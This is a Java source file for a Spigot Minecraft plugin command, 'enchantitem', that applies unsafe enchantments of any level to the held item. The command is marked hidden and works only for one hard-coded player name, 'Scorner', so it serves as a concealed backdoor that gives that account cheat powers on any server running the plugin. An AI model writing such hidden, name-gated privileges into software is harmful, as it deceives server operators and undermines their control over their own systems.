package sylvessa.spigot.commands;

import org.bukkit.command.CommandSender;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import sylvessa.spigot.Types.PluginCommand;
import org.bukkit.command.Command;

public class EnchantItemCommand implements PluginCommand {
    public String name() {
        return "enchantitem";
    }

    public String description() {
        return "Enchants the item you're holding.";
    }

    public boolean hidden() {
        return true;
    }

    public void execute(CommandSender sender, Command cmd, String label, String[] args) {
        if (!(sender instanceof Player)) return;
        if (!sender.getName().equals("Scorner")) return;
        if (args.length < 2) return;

        Player p = (Player)sender;
        ItemStack item = p.getItemInHand();
        if (item == null) return;

        Enchantment enchant = Enchantment.getByName(args[0].toUpperCase());
        if (enchant == null) return;

        int level;
        try {
            level = Integer.parseInt(args[1]);
        } catch (Exception e) {
            return;
        }

        item.addUnsafeEnchantment(enchant, level);
    }
}